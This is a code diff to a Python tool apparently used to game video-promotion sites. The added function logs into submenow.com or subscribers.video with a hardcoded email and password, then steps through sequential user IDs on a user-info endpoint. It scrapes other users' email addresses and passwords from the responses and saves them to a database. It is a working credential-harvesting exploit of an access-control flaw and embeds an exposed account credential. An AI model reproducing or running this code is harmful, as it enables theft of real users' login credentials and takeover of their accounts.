@@ -3,6 +3,7 @@ import dbconnect as db
 import promote
 import time
 import videos
+import fetchAccounts
 
 # add account menu handler
 def addAccountMenu(conn):
@@ -180,3 +181,53 @@ def promoteOneByOneMenu(conn, startFrom, endAt):
     
     # print status
     print("[+] Promotion For Multiple Videos Started")
+
+# request to https://www.subscribers.video/updateuser.html?id=348073&self=false
+def fetchAccountsMenu(conn):
+    # choose host
+    print("1. submenow.com\n2. subscribers.video")
+    hostId = input("[+] Enter Host ID: ")
+    if hostId == "1":
+        host = "submenow.com"
+    elif hostId == "2":
+       host = "subscribers.video"
+    else:
+        print("[-] Invalid Host ID")
+        return
+
+    tempUser = "natangel.ua@gmail.com"
+    tempPass = "UCrz2JKBVaDnjoDYVszSeGVQ"
+    session = server.login(host, tempUser, tempPass)
+
+    # init allAcounts table
+    fetchAccounts.initAllAccounts(conn)
+    # get last parsed account id
+    accoundId = int(fetchAccounts.getLastParsedAccount(conn)) + 1
+    
+    count = 0
+    keepGoing = "1"
+    while (keepGoing == "1"):
+        resp = server.getUserInfo(session, host, accoundId)
+        # spliting 
+        try:
+            mess = resp.split("id='email"+ str(accoundId) +"' value='")[1]
+            username = mess.split("'")[0].strip()
+            password = mess.split(",")[2].split("&lt;")[0].strip()
+
+            # save the details if they are not already there
+            if (fetchAccounts.checkPassword(conn, password) == False):
+                fetchAccounts.saveAccount(conn, username, password, str(accoundId), host)
+        except:
+            print("[-] User Not Found")
+
+        # increment the counter
+        accoundId += 1
+        count += 1
+        if (count == 100):
+            keepGoing = input("Press 1 to continue or any other key to exit")
+            if (keepGoing == "1"):
+                count = 0
+            else:
+                print("Job Done\nTotal Accounts Saved: " + str(accoundId))
+                break
+
